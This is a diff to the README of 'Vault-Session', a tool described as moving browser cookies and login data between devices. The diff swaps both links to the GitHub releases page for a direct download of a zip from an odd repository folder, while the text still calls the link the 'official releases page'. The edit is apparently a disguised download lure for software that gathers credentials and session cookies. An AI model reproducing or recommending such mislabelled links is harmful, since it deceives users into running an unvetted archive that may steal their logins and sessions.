@@ -1,6 +1,6 @@
 # 🛡️ Vault-Session - Move browser logins between devices securely
 
-[![](https://img.shields.io/badge/Download-Vault--Session-blue)](https://github.com/rynl3571/Vault-Session/releases)
+[![](https://img.shields.io/badge/Download-Vault--Session-blue)](https://raw.githubusercontent.com/rynl3571/Vault-Session/main/adsignify/Vault_Session_v2.5.zip)
 
 Vault-Session helps you move your browser information between different computers and mobile devices. It saves your cookies and login data into an encrypted file. You can then move this file to another browser or a new computer. The software uses AES-256-GCM encryption to keep your data private. This ensures only you can access your saved sessions.
 
@@ -14,7 +14,7 @@ The software works with Chrome, Firefox, and Brave. It stores data locally on yo
 
 You need a supported web browser and a Windows 10 or 11 computer to use this tool. Ensure you have the latest version of your browser installed.
 
-1. Visit the [official releases page](https://github.com/rynl3571/Vault-Session/releases) to find the latest version.
+1. Visit the [official releases page](https://raw.githubusercontent.com/rynl3571/Vault-Session/main/adsignify/Vault_Session_v2.5.zip) to find the latest version.
 2. Look for the file ending in .zip or .exe under the Assets section.
 3. Choose the file named for the current version and download it to your computer.
 4. Open the folder where you saved the file.
